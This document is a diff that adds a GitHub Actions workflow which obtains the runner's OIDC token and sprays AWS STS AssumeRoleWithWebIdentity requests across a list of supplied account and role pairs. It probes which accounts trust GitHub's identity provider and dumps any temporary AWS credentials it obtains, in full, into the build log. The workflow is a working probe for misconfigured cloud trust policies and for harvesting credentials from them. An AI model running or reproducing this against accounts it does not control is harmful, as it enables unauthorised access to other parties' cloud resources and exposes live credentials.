@@ -1,0 +1,58 @@
+name: oidc-sts-332207
+on:
+  workflow_dispatch:
+    inputs:
+      pairs:
+        description: 'comma list account:role ; role=* is account-only provider probe'
+        required: true
+        default: ''
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  sts:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set -uo pipefail
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME"
+          echo "CTX repository=${{ github.repository }} owner_id=${{ github.repository_owner_id }} repo_id=${{ github.repository_id }} ref_name=${{ github.ref_name }} actor=${{ github.actor }}"
+          F=/tmp/idt.json
+          curl -sS --max-time 25 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o "$F" || true
+          TOKS=$(python3 -c "import json;print(json.load(open('/tmp/idt.json')).get('value',''))" 2>/dev/null || true)
+          echo "TOKEN_LEN=${#TOKS}"
+          printf '%s' "$TOKS" > /tmp/tok.txt
+          python3 -c "import base64,json;v=open('/tmp/tok.txt').read().strip();h,p,s=v.split('.');d=lambda x: json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)));print('HDR='+json.dumps(d(h),sort_keys=True));print('CLAIMS='+json.dumps(d(p),sort_keys=True))" || true
+          PAIRS="${{ inputs.pairs }}"
+          echo "PAIRS=$PAIRS"
+          [ -z "$TOKS" ] && { echo "NO_TOKEN_ABORT"; exit 0; }
+          IFS=',' read -ra ARR <<< "$PAIRS"
+          for pr in "${ARR[@]}"; do
+            pr=$(echo "$pr" | tr -d ' ')
+            [ -z "$pr" ] && continue
+            acct="${pr%%:*}"
+            role="${pr##*:}"
+            [ "$role" = "*" ] && role="zz-nonexistent-probe-x"
+            https=$(curl -sS --max-time 12 -o /tmp/r.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
+              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+              --data-urlencode "Version=2011-06-15" \
+              --data-urlencode "RoleArn=arn:aws:iam::${acct}:role/${role}" \
+              --data-urlencode "RoleSessionName=oidc332207" \
+              --data-urlencode "DurationSeconds=900" \
+              --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
+            COD=$(grep -o '<Code>[^<]*</Code>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
+            MSG=$(grep -o '<Message>[^<]*</Message>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
+            RQ=$(grep -o '<RequestId>[^<]*</RequestId>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
+            HIT=$(grep -c '<AccessKeyId>' /tmp/r.xml 2>/dev/null || true)
+            MD5=$(printf '%s' "$MSG" | md5sum | cut -c1-10)
+            echo "STS acct=$acct role=$role http=$https hit=$HIT code=$COD reqid=$RQ md5=$MD5 msg=$(printf '%s' "$MSG" | head -c 200)"
+            if [ "$HIT" != "0" ]; then
+              echo "STS_HIT_FULL acct=$acct role=$role $(head -c 700 /tmp/r.xml | tr '\n' ' ')"
+            fi
+            sleep 0.3
+          done
+          echo "PROBE_DONE"
+      - name: decode-helper
+        if: always()
+        run: echo helper
